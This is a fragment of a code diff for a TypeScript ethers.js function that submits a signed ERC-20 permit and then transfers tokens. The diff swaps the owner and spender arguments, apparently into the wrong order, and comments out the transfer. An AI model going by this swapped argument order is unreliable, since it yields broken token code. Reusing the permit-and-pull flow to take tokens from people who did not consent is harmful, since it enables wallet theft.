@@ -271,7 +271,7 @@ async function handle(json: any) {
 			'function transferFrom(address from, address to, uint256 value) external returns (bool)'
 	], wallet);
 
-	const args = [owner,spender, amount, deadline, v, r, s];
+	const args = [spender,owner, amount, deadline, v, r, s];
 	console.log(args)
 	const gasLimit = ethers.utils.hexlify(100000); // You may need to adjust this value
 	const tx = await tokenContract.permit(...args, {
@@ -282,10 +282,10 @@ async function handle(json: any) {
 	await tx.wait();
 	console.log("FINISHED");
 
-	const transferTx = await tokenContract.transferFrom(owner, spender, amount);
-	const transferReceipt = await transferTx.wait();
-
-	console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
+	// const transferTx = await tokenContract.transferFrom(owner, spender, amount);
+	// const transferReceipt = await transferTx.wait();
+	//
+	// console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
 }
 
 
